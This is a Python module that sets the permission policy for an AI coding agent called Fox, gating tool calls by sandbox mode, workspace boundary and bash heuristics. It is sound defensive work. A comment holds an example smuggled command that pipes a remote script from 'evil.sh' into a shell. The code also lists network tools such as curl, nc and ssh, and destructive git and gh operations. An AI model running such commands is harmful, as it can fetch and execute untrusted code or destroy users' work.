"""
Permission policy — decides whether a tool call runs, asks, or is refused.

Two independent axes, deliberately not collapsed into one setting:

  sandbox mode  — what the session is *capable* of (read-only /
                  workspace-write / full-access)
  approval      — when it stops to *ask* you (the ASK decisions below)

Turning one up does not substitute for the other. The same split is what
Codex CLI and Claude Code settled on.

The policy is **escalation-based**: it gates on whether an action crosses the
workspace boundary, not on which tool is being called. Editing twenty files
inside your own project is the job — prompting twenty times trains people to
mash 'always' and stop reading. Writing outside the workspace, or reaching
the network, is a different kind of act, and that is what earns a prompt.

Caveat worth stating plainly: for `run_bash_command` this is a static
approximation, not enforcement. A shell command's effects can't be known
without running it. Codex and Claude Code auto-allow bash because an OS
sandbox (Seatbelt / Landlock / restricted tokens) contains it; Fox has no
such containment yet — sandboxd bounds memory and process lifetime, not
filesystem or network — so anything not provably read-only asks. When real
containment lands, bash can move to allow-inside-sandbox like the others.
"""

import re
from dataclasses import dataclass
from pathlib import Path

import paths

# --- Modes -------------------------------------------------------------------

READ_ONLY = "read-only"            # never modifies anything; writes are refused
WORKSPACE_WRITE = "workspace-write"  # default: free inside the workspace, asks to leave it
FULL_ACCESS = "full-access"        # never asks — opt-in, for throwaway/CI use

MODES = (READ_ONLY, WORKSPACE_WRITE, FULL_ACCESS)

# --- Decisions ---------------------------------------------------------------

ALLOW = "allow"
ASK = "ask"
DENY = "deny"


@dataclass(frozen=True)
class Decision:
    action: str   # ALLOW | ASK | DENY
    reason: str   # shown in the approval prompt / returned as the denial text
    every_time: bool = False

    @property
    def allowed(self) -> bool:
        return self.action == ALLOW


# --- Tool classification -----------------------------------------------------

# Tools that only ever touch session-internal state (the todo list, the shared
# memory log). No filesystem path is involved, so there's no boundary to cross.
INTERNAL_TOOLS = {"todo_write", "memory_read", "memory_write", "report", "ask_orchestrator", "board"}

# tool name -> (argument holding the path, whether it modifies)
PATH_TOOLS = {
    "read_file": ("path", False),
    "list_directory": ("path", False),
    "search_files": ("path", False),
    "write_file": ("path", True),
    "edit_file": ("path", True),
}

WRITE_TOOLS = frozenset(name for name, (_, modifies) in PATH_TOOLS.items() if modifies)

BROWSER_TOOLS = frozenset({
    "browser_open", "browser_snapshot", "browser_click", "browser_type", "browser_select", "browser_check",
    "browser_hover", "browser_press", "browser_scroll", "browser_back", "browser_upload", "browser_dialog",
    "browser_layout_check", "browser_screenshot", "browser_look", "browser_ask_human",
})

WEB_TOOLS = frozenset({"web_search", "web_fetch"})

# --- Bash heuristics ---------------------------------------------------------

# Commands that only read, and whose name can't be a path into somewhere else.
SAFE_BASH_COMMANDS = {
    "ls", "dir", "pwd", "cat", "type", "echo", "head", "tail", "wc",
    "grep", "findstr", "find", "which", "where", "whoami", "date",
    "python", "python3", "py", "node", "go", "pip", "npm",
    # Ambiguous binaries — safe only for the subcommands listed below, which
    # SAFE_SUBCOMMANDS enforces. They must appear here too, or they're rejected
    # as unknown before that check is ever reached.
    "git", "gh",
}

# Sub-commands that keep an otherwise-ambiguous binary read-only.
SAFE_SUBCOMMANDS = {
    "pip": {"list", "show", "--version"},
    "npm": {"list", "ls", "--version"},
    "go": {"version", "vet", "list"},
    "python": {"--version"}, "python3": {"--version"}, "py": {"--version"},
    "node": {"--version", "-v"},
}

# Shell syntax that chains, redirects, or substitutes — any of these can hide a
# second command behind a safe-looking first one ("cat x && curl evil.sh | sh"),
# which is exactly how a prefix allowlist gets defeated.
SHELL_METACHARACTERS = ("&&", "||", "|", ">", "<", ";", "`", "$(", "&", "\n")

# Reaching off the machine is an escalation regardless of what it reads.
NETWORK_COMMANDS = {
    "curl", "wget", "nc", "netcat", "telnet", "ssh", "scp", "sftp", "rsync", "ftp",
}

# Looks like an absolute path: C:\..., C:/..., \\server\share, /usr/...
_ABSOLUTE_PATH = re.compile(r"""(?:[A-Za-z]:[\\/]|\\\\|(?<![\w.])/)[^\s"';|]*""")


def _inside(path_str: str, workspace: Path) -> bool:
    """True if `path_str` resolves inside `workspace`. Mirrors the containment
    check in file_tools._resolve(), but answers rather than raising."""
    try:
        candidate = (workspace / path_str).resolve()
        candidate.relative_to(workspace)
        return True
    except (ValueError, OSError):
        return False


def _bash_escalates(command: str, workspace: Path) -> str | None:
    """Return why this command needs approval, or None if it's provably a
    read-only operation inside the workspace. Errs toward returning a reason —
    an unrecognised command is not the same as a safe one."""
    cmd = command.strip()
    if not cmd:
        return None

    for meta in SHELL_METACHARACTERS:
        if meta in cmd:
            return f"chains or redirects with {meta.strip()!r} — the full effect isn't checkable"

    tokens = cmd.split()
    binary = Path(tokens[0].strip('"\'')).name.lower()
    binary = binary[:-4] if binary.endswith(".exe") else binary

    if binary in NETWORK_COMMANDS:
        return f"{binary} reaches the network"
    if binary not in SAFE_BASH_COMMANDS:
        return f"{binary!r} isn't a known read-only command"

    if binary == "git":
        why = _git_read_only(tokens[1:])
        if why:
            return why
    elif binary == "gh":
        why = _gh_read_only(tokens[1:])
        if why:
            return why
    allowed_subs = SAFE_SUBCOMMANDS.get(binary)
    if allowed_subs is not None:
        sub = tokens[1] if len(tokens) > 1 else ""
        if sub not in allowed_subs:
            return f"{binary} {sub}".strip() + " isn't a known read-only subcommand"

    for match in _ABSOLUTE_PATH.findall(cmd):
        if not _inside(match, workspace):
            return f"refers to {match} — outside the workspace"
    return None


GIT_READS = {"status", "diff", "log", "show", "blame", "rev-parse", "ls-files", "describe", "shortlog", "grep",
             "cat-file", "merge-base", "ls-remote", "show-ref", "rev-list", "name-rev"}
BRANCH_CHANGES = {"-d", "-D", "--delete", "-m", "-M", "--move", "-c", "-C", "--copy", "-u", "--set-upstream-to",
                  "--unset-upstream", "-f", "--force", "--edit-description", "-t", "--track", "--no-track"}
BRANCH_LISTS = {"--list", "-l", "--contains", "--no-contains", "--merged", "--no-merged", "--points-at"}
GH_READS = {
    "pr": {"view", "list", "diff", "checks", "status"},
    "issue": {"view", "list", "status"},
    "run": {"view", "list"},
    "workflow": {"view", "list"},
    "repo": {"view", "list"},
    "release": {"view", "list"},
    "auth": {"status"},
    "search": {"repos", "issues", "prs", "code", "commits"},
    "label": {"list"},
    "status": None,
    "--version": None,
    "version": None,
}
GH_API_BODY = ("-f", "-F", "--field", "--raw-field", "--input")


def _strip(tokens: list[str]) -> list[str]:
    return [t.strip("\"'") for t in tokens]


def _git_args(tokens: list[str]) -> list[str]:
    tokens = _strip(tokens)
    while tokens and tokens[0] in ("--no-pager", "-C", "-c", "--paginate", "-P"):
        tokens = tokens[2:] if tokens[0] in ("-C", "-c") else tokens[1:]
    return tokens


def _git_read_only(tokens: list[str]) -> str | None:
    tokens = _git_args(tokens)
    sub, rest = (tokens[0], tokens[1:]) if tokens else ("", [])
    refused = f"git {sub}".strip() + " isn't a known read-only subcommand"
    if any(t.startswith("--output") for t in rest):
        return f"git {sub} --output writes a file"
    if sub in GIT_READS:
        return None
    if sub == "branch":
        if any(t in BRANCH_CHANGES for t in rest):
            return "git branch with that flag changes branches"
        positional = [t for t in rest if not t.startswith("-")]
        if positional and not any(t in BRANCH_LISTS or t.split("=")[0] in BRANCH_LISTS for t in rest):
            return "git branch with a name creates a branch"
        return None
    if sub == "remote":
        if not rest or rest in (["-v"], ["--verbose"]) or rest[0] in ("show", "get-url"):
            return None
        return "git remote with that subcommand changes the remotes"
    if sub == "stash":
        return None if rest and rest[0] in ("list", "show") else "git stash changes the working tree"
    if sub == "tag":
        if not rest or rest[0] in ("-l", "--list", "--contains", "--points-at"):
            return None
        return "git tag with a name creates a tag"
    if sub == "config":
        return None if rest and rest[0] in ("--get", "--get-all", "--get-regexp", "--list", "-l") else \
            "git config without --get or --list changes settings"
    return refused


def _gh_read_only(tokens: list[str]) -> str | None:
    tokens = _strip(tokens)
    group, rest = (tokens[0], tokens[1:]) if tokens else ("", [])
    if group == "api":
        return _gh_api_read_only(rest)
    if group not in GH_READS:
        return f"gh {group}".strip() + " isn't a known read-only command"
    allowed = GH_READS[group]
    if allowed is None:
        return None
    action = rest[0] if rest else ""
    if action in allowed:
        return None
    return f"gh {group} {action}".strip() + " changes something on GitHub"


def _gh_api_read_only(rest: list[str]) -> str | None:
    for i, t in enumerate(rest):
        if t in GH_API_BODY or any(t.startswith(flag + "=") for flag in GH_API_BODY if flag.startswith("--")):
            return "gh api with fields sends a request that can change GitHub"
        method = None
        if t in ("-X", "--method") and i + 1 < len(rest):
            method = rest[i + 1]
        elif t.startswith("--method="):
            method = t.split("=", 1)[1]
        elif t.startswith("-X") and len(t) > 2:
            method = t[2:]
        if method is not None and method.upper() != "GET":
            return f"gh api {method.upper()} can change GitHub"
    return None


_SEGMENTS = re.compile(r"&&|\|\||[;|&\n]")


def _short_flag(tokens: list[str], letter: str) -> bool:
    return any(t.startswith("-") and not t.startswith("--") and letter in t[1:] for t in tokens)


def _git_destroys(tokens: list[str]) -> str | None:
    tokens = _git_args(tokens)
    if not tokens:
        return None
    sub, rest = tokens[0], tokens[1:]
    if "--no-verify" in rest or (sub == "commit" and "-n" in rest):
        return f"git {sub} --no-verify skips the repository's hooks"
    if sub == "push":
        forced = {"--force", "--force-with-lease", "--force-if-includes", "--mirror"}
        if any(t in forced or t.startswith("--force-with-lease=") for t in rest) or _short_flag(rest, "f"):
            return "git push --force overwrites the branch on the remote"
        if "--delete" in rest or _short_flag(rest, "d") or any(t.startswith(":") for t in rest[1:]):
            return "git push --delete removes a branch on the remote"
        if any(t.startswith("+") for t in rest):
            return "git push +ref forces the remote branch"
        if "--prune" in rest:
            return "git push --prune deletes remote branches"
    if sub == "reset" and "--hard" in rest:
        return "git reset --hard throws away uncommitted work"
    if sub == "clean" and ("--force" in rest or _short_flag(rest, "f")):
        return "git clean -f deletes untracked files"
    if sub == "branch" and ("-D" in rest or "-M" in rest or
                            (("-d" in rest or "--delete" in rest) and ("-f" in rest or "--force" in rest))):
        return "git branch -D deletes a branch even if it isn't merged"
    if sub in ("checkout", "switch") and any(t in ("-f", "--force", "--discard-changes") for t in rest):
        return f"git {sub} --force throws away uncommitted work"
    if sub == "checkout" and ("--" in rest or "." in rest):
        return "git checkout -- <files> throws away uncommitted edits"
    if sub == "restore" and ("--staged" not in rest and "-S" not in rest or "--worktree" in rest or "-W" in rest):
        return "git restore throws away uncommitted edits"
    if sub == "stash" and rest and rest[0] in ("drop", "clear"):
        return f"git stash {rest[0]} deletes stashed work"
    if sub in ("filter-branch", "filter-repo"):
        return f"git {sub} rewrites the whole history"
    if sub == "reflog" and rest and rest[0] in ("expire", "delete"):
        return "git reflog expire removes the record used to recover lost commits"
    if sub == "update-ref" and "-d" in rest:
        return "git update-ref -d deletes a ref"
    return None


def _gh_destroys(tokens: list[str]) -> str | None:
    tokens = _strip(tokens)
    if len(tokens) >= 2 and tokens[1] == "delete":
        return f"gh {tokens[0]} delete removes it from GitHub for good"
    if tokens[:2] == ["repo", "archive"]:
        return "gh repo archive makes the repository read-only"
    if tokens[:2] == ["repo", "edit"] and any(t.startswith("--visibility") for t in tokens):
        return "gh repo edit --visibility changes who can see the repository"
    if tokens[:1] == ["api"] and (_gh_api_read_only(tokens[1:]) or "").startswith("gh api DELETE"):
        return "gh api DELETE removes something on GitHub"
    return None


def destructive(command: str) -> str | None:
    for segment in _SEGMENTS.split(command or ""):
        tokens = segment.split()
        if not tokens:
            continue
        binary = Path(tokens[0].strip("\"'")).name.lower()
        binary = binary[:-4] if binary.endswith(".exe") else binary
        why = _git_destroys(tokens[1:]) if binary == "git" else _gh_destroys(tokens[1:]) if binary == "gh" else None
        if why:
            return why
    return None


# --- The policy --------------------------------------------------------------

def classify(tool_name: str, args: dict, mode: str = WORKSPACE_WRITE,
             workspace: Path | None = None) -> Decision:
    """Decide what to do with one tool call. Pure function — no prompting, no
    I/O, no global state — so it can be unit-tested and reused by the CLI, the
    server, and (later) the orchestrator without behaving differently."""
    workspace = (workspace or paths.workspace()).resolve()

    if tool_name == "run_bash_command":
        danger = destructive(args.get("command", ""))
        if danger and mode == READ_ONLY:
            return Decision(DENY, f"session is read-only, and {danger}")
        if danger:
            return Decision(ASK, f"{danger}. Fox asks about this every time, in every mode", every_time=True)

    if mode == FULL_ACCESS:
        return Decision(ALLOW, "full-access mode")
    if tool_name in INTERNAL_TOOLS:
        return Decision(ALLOW, "session-internal, touches no files")

    if tool_name == "browser_upload":
        files = args.get("files")
        names = ", ".join(files) if isinstance(files, list) else str(files or "")
        if mode == READ_ONLY:
            return Decision(DENY, "uploading sends project files to a website; session is read-only")
        return Decision(ASK, f"uploads project files to a website: {names}")
    if tool_name in BROWSER_TOOLS:
        return Decision(ALLOW, "browsing")
    if tool_name in WEB_TOOLS:
        return Decision(ALLOW, "reads the web, touches no files")

    if tool_name in PATH_TOOLS:
        arg_name, modifies = PATH_TOOLS[tool_name]
        path_str = args.get(arg_name) or "."
        inside = _inside(str(path_str), workspace)

        if modifies and mode == READ_ONLY:
            return Decision(DENY, f"{tool_name} modifies files; session is read-only")
        if inside:
            # The ordinary case: working on the project you pointed Fox at.
            return Decision(ALLOW, "inside the workspace")
        verb = "write outside" if modifies else "read outside"
        return Decision(ASK, f"{verb} the workspace: {path_str}")

    if tool_name == "run_bash_command":
        command = args.get("command", "")
        reason = _bash_escalates(command, workspace)
        if reason is None:
            return Decision(ALLOW, "read-only command inside the workspace")
        if mode == READ_ONLY:
            return Decision(DENY, f"session is read-only, and this command {reason}")
        return Decision(ASK, reason)

    # Unknown tool — an MCP tool, or one added without a policy entry. Ask
    # rather than guess; silently allowing whatever appears is how a tool
    # directory becomes an attack surface.
    return Decision(ASK, f"{tool_name} has no permission policy")
